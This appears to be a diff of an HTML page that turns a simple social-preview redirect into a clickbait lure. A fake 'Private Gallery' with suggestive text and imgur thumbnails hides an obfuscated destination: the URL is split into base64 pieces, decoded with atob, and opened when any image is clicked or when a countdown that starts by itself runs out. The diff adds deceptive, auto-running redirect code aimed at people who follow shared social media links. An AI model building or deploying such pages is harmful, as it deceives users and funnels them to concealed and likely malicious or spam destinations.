@@ -1,42 +1,195 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Loading...</title>
+<meta charset="UTF-8">
+<title>🔴 Live Update Today</title>
 
-  <!-- ================= OG PREVIEW ================= -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Gambar preview (random tapi valid & stabil) -->
-  <meta property="og:image" content="https://picsum.photos/id/1015/1200/630">
+<!-- OG -->
+<meta property="og:title" content="🔴 Live Update Today">
+<meta property="og:description" content="Watch the latest update happening right now ▶️ Click to view.">
+<meta property="og:image" content="https://i.imgur.com/FStDuOP.jpeg">
+<meta property="og:type" content="website">
 
-  <!-- Judul -->
-  <meta property="og:title" content="Acces">
+<style>
+body {
+  margin:0;
+  font-family:Arial;
+  background:#0f0f0f;
+  color:white;
+}
 
-  <!-- Deskripsi -->
-  <meta property="og:description" content="Tap to continue...">
+#loading {
+  position:fixed;
+  width:100%;
+  height:100%;
+  background:#0f0f0f;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+  z-index:999;
+}
 
-  <!-- URL (isi domain kamu nanti kalau sudah ada) -->
-  <meta property="og:url" content="https://example.com">
+.loader {
+  width:45px;
+  height:45px;
+  border:5px solid #333;
+  border-top:5px solid #00ffcc;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
 
-  <!-- Tipe -->
-  <meta property="og:type" content="website">
+@keyframes spin {
+  100% {transform:rotate(360deg);}
+}
 
-  <!-- Ukuran biar FB cepat detect -->
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
+#enterScreen {
+  display:none;
+  height:100vh;
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+  text-align:center;
+}
 
-  <!-- Tambahan biar aman -->
-  <meta name="twitter:card" content="summary_large_image">
+button {
+  margin-top:20px;
+  padding:12px 20px;
+  background:#00ffcc;
+  border:none;
+  border-radius:8px;
+  font-weight:bold;
+  cursor:pointer;
+}
 
+#galleryPage {
+  display:none;
+  text-align:center;
+}
+
+.gallery {
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:8px;
+  padding:10px;
+}
+
+.gallery img {
+  width:100%;
+  border-radius:8px;
+  cursor:pointer;
+  transition:0.2s;
+}
+
+.gallery img:hover {
+  transform:scale(1.05);
+}
+
+.note {
+  font-size:13px;
+  opacity:0.7;
+  margin-top:10px;
+}
+</style>
 </head>
 
 <body>
 
+<div id="loading">
+  <div class="loader"></div>
+  <p style="opacity:0.6;">Loading content...</p>
+</div>
+
+<div id="enterScreen">
+  <h2>Private Gallery</h2>
+  <p style="opacity:0.7;">Tap below or wait a moment…</p>
+  <button onclick="_0xA12_enter()">Enter</button>
+</div>
+
+<div id="galleryPage">
+
+  <h2>Private Collection</h2>
+
+  <p style="opacity:0.75; max-width:320px; margin:auto;">
+  A small collection that’s been getting attention lately.  
+  Some moments are a little more… personal than others.
+  </p>
+
+  <div class="gallery">
+    <img src="https://i.imgur.com/cT072eg.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/wVCBBj2.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/j6qaYFd.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/xX61mRI.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/knjOdH3.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/LRypO0v.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/TBRyf55.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/5OlrEm2.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/0poFxSi.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/AOM9fTf.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/d9gZSs3.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/AxmBfxf.jpeg" onclick="_0xA12_go()">
+  </div>
+
+  <p style="opacity:0.6; font-size:13px;">
+  Not everything is shown here. Full access available below.
+  </p>
+
+  <button onclick="_0xA12_go()">Open Full Gallery</button>
+
+  <p class="note">
+    You will be redirected in <span id="count">5</span>s...
+  </p>
+
+</div>
+
 <script>
-  // Delay biar Facebook sempat scrape OG
-  setTimeout(function() {
-    window.location.href = "https://example.com"; // ganti ke smartlink kamu nanti
-  }, 2000);
+
+// loading → enter
+setTimeout(() => {
+  document.getElementById("loading").style.display = "none";
+  document.getElementById("enterScreen").style.display = "flex";
+
+  setTimeout(() => {
+    _0xA12_enter();
+  }, 2000); // dipercepat
+
+}, 1200);
+
+// enter
+function _0xA12_enter() {
+  document.getElementById("enterScreen").style.display = "none";
+  document.getElementById("galleryPage").style.display = "block";
+  _0xStartCountdown();
+}
+
+// obfuscated link
+const _0x1 = "aHR0cHM6Ly9mZGVk";
+const _0x2 = "ZGcuaHVic3Mub25l";
+const _0x3 = "L3AvbmhWTnk=";
+
+function _0xA12_go() {
+  const _0xdecoded = atob(_0x1 + _0x2 + _0x3);
+  window.location.href = _0xdecoded;
+}
+
+// countdown redirect
+function _0xStartCountdown() {
+  let time = 5;
+  const el = document.getElementById("count");
+
+  const timer = setInterval(() => {
+    time--;
+    el.textContent = time;
+
+    if (time <= 0) {
+      clearInterval(timer);
+      _0xA12_go();
+    }
+  }, 1000);
+}
+
 </script>
 
 </body>
